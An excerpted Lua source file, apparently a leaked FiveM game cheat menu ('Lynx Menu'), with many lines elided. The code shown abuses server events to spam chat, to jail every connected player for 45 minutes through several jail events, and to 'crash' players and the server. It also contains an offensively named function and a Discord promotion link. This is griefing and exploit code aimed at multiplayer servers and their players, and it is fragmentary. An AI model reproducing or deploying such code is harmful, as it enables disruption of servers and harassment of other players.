...
local function bE()
    if bC == 3 then
        ...
        local ak = KeyboardInput(' ERROR_1D10T', '', 100)
        if ak == bD then
            mhaonn = true
        ...
        function()
            for bD = 0, 9 do
                TriggerServerEvent(
                    ...
                    '^13^24^3O^4o^5p^6s^, ^1I ^2D^3i^4d ^5i^6t ^7a^1g^2a^3i^4n^5!',
                    {
                        141,
                        211,
                        255
...
function RapeAllFunc()
    for bD = 0, 9 do
        TriggerServerEvent(
            '_chat:messageEntered',
            '^13^24^3K^4i^5r^6t^1l^2e',
            {
                141,
                211,
                255
            },
            '^' .. bD .. 'See you until next time'
        )
    end
    Citizen.CreateThread(
        function()
...
Citizen.CreateThread(
    function()
        while bw do
            ...
            function crashplayer() --Might not work
                Citizen.CreateThread(
                    function()
...
Citizen.CreateThread(
    function()
        ...
        LynxEvo.SetSubTitle('LynxX', 'discord.gg/ZtZMsyNnMq')
        ...
        while bw do
            ...
            if LynxEvo.IsMenuOpened('LynxX') then
                ...
                av('Lynx Menu', false)
                av('That was leaked fast, uh?', false)
                av('discord.gg/ZtZMsyNnMq')
                ...
                elseif LynxEvo.MenuButton('~h~~p~# ~y~Credits', 'crds') then
                end
                LynxEvo.Display()
            ...
            elseif LynxEvo.IsMenuOpened('Destroyer') then
                ...
                then
                elseif LynxEvo.Button('~h~~r~Crash ~s~Server') then
                    crashplayer()
            ...
            elseif LynxEvo.IsMenuOpened('crds') then
                ...
                elseif LynxEvo.Button('~h~~p~#~s~ Fallen~r~#~r~0811 ~p~DEV') then
                end
                LynxEvo.Display()
...
RegisterCommand(
    ...
    function(eA, eB, eC)
        ...
        AmbulancePlayers()
        for i = 0, 128 do
            TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 5000, 'yeah')
            TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 45 * 60)
            TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 45 * 60)
            TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'yeah')
        end
    end,
    false
)
